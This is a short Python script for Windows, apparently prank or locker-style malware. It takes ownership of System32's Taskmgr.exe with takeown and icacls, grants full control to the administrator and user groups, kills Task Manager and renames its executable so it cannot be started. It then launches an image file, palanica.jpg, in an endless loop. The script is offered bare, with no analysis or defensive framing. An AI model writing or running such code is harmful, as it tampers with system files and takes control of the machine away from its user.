import os
import time


os.system("python startup.py")

path1 = "C:\Windows\System32\Taskmgr.exe"
path2 = "C:\Windows\System32\Taskmgr1.exe"
os.system("takeown /f C:\Windows\System32\Taskmgr.exe")  
os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Администраторы:F /c /l") 
os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Пользователи:F /c /l")
os.system("taskkill /im taskmgr.exe")
os.rename(path1, path2)


os.system("palanica.jpg")
time.sleep(1)
while True:
    os.system("palanica.jpg")